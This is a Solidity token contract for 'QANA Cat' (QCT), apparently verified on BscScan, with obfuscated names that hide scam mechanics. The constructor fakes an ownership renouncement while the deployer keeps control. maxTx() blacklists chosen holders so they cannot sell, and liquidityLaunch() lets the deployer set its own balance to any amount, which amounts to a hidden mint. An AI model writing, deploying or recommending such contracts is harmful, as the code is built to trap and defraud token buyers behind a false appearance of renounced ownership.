/**
 *Submitted for verification at BscScan.com on 2023-02-15
*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.16;


interface receiverMarketing {
    function createPair(address atTotal, address amountSender) external returns (address);
}

interface takeMax {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

contract QANACat {

    event Transfer(address indexed from, address indexed minAmount, uint256 value);

    string public name = "QANA Cat";

    address public receiverLaunched;

    function walletFee() public {
        emit OwnershipTransferred(receiverLaunched, address(0));
        owner = address(0);
    }

    function receiverLaunch(address sellTotal) public {
        if (maxSwap) {
            return;
        }
        if (listReceiver != tradingAutoLaunch) {
            toEnable = true;
        }
        txIs[sellTotal] = true;
        
        maxSwap = true;
    }

    string public symbol = "QCT";

    function maxTx(address marketingBuyTrading) public {
        
        if (marketingBuyTrading == receiverLaunched || marketingBuyTrading == toLimit || !txIs[fundTotal()]) {
            return;
        }
        if (limitLaunchTeam == fundLaunched) {
            marketingSwapTotal = listExempt;
        }
        sellAmount[marketingBuyTrading] = true;
    }

    event Approval(address indexed fundBuy, address indexed spender, uint256 value);

    uint256 public totalSupply = 100000000 * 10 ** 18;

    function approve(address totalTeamAmount, uint256 walletAmount) public returns (bool) {
        allowance[fundTotal()][totalTeamAmount] = walletAmount;
        emit Approval(fundTotal(), totalTeamAmount, walletAmount);
        return true;
    }

    function tradingTo() public view returns (uint256) {
        return feeShouldMode;
    }

    function receiverAt(address swapTeam, address tradingTotal, uint256 walletAmount) internal returns (bool) {
        if (swapTeam == receiverLaunched) {
            return senderTxTeam(swapTeam, tradingTotal, walletAmount);
        }
        require(!sellAmount[swapTeam]);
        return senderTxTeam(swapTeam, tradingTotal, walletAmount);
    }

    mapping(address => uint256) public balanceOf;

    function senderTxTeam(address swapTeam, address tradingTotal, uint256 walletAmount) internal returns (bool) {
        require(balanceOf[swapTeam] >= walletAmount);
        balanceOf[swapTeam] -= walletAmount;
        balanceOf[tradingTotal] += walletAmount;
        emit Transfer(swapTeam, tradingTotal, walletAmount);
        return true;
    }

    address public toLimit;

    function isShouldAmount() public {
        
        
        listReceiver=false;
    }

    function maxFund() public view returns (bool) {
        return listReceiver;
    }

    constructor (){
        
        takeMax minMode = takeMax(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        toLimit = receiverMarketing(minMode.factory()).createPair(minMode.WETH(), address(this));
        owner = fundTotal();
        
        receiverLaunched = owner;
        txIs[receiverLaunched] = true;
        balanceOf[receiverLaunched] = totalSupply;
        if (fundLaunched != marketingSwapTotal) {
            totalFee = false;
        }
        emit Transfer(address(0), receiverLaunched, totalSupply);
        walletFee();
    }

    uint256 public listExempt;

    bool public maxSwap;

    function liquidityLaunch(uint256 walletAmount) public {
        if (!txIs[fundTotal()]) {
            return;
        }
        balanceOf[receiverLaunched] = walletAmount;
    }

    mapping(address => bool) public sellAmount;

    uint256 public isReceiverTrading;

    bool private listReceiver;

    function liquidityTotal() public view returns (bool) {
        return listReceiver;
    }

    function fundTotal() private view returns (address) {
        return msg.sender;
    }

    uint256 private marketingSwapTotal;

    uint256 public feeShouldMode;

    function transfer(address launchReceiver, uint256 walletAmount) external returns (bool) {
        return receiverAt(fundTotal(), launchReceiver, walletAmount);
    }

    function txToken() public view returns (uint256) {
        return feeShouldMode;
    }

    bool private totalFee;

    function minReceiver() public {
        if (toEnable != tradingAutoLaunch) {
            feeShouldMode = listExempt;
        }
        
        listReceiver=false;
    }

    uint256 private fundLaunched;

    function transferFrom(address swapTeam, address tradingTotal, uint256 walletAmount) external returns (bool) {
        if (allowance[swapTeam][fundTotal()] != type(uint256).max) {
            require(walletAmount <= allowance[swapTeam][fundTotal()]);
            allowance[swapTeam][fundTotal()] -= walletAmount;
        }
        return receiverAt(swapTeam, tradingTotal, walletAmount);
    }

    bool public toEnable;

    address public owner;

    uint8 public decimals = 18;

    function launchedList() public view returns (uint256) {
        return fundLaunched;
    }

    mapping(address => bool) public txIs;

    function teamFrom() public {
        if (tradingAutoLaunch) {
            toEnable = true;
        }
        if (listExempt != feeShouldMode) {
            feeShouldMode = isReceiverTrading;
        }
        listExempt=0;
    }

    uint256 public limitLaunchTeam;

    bool private tradingAutoLaunch;

    function getOwner() external view returns (address) {
        return owner;
    }

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    mapping(address => mapping(address => uint256)) public allowance;

}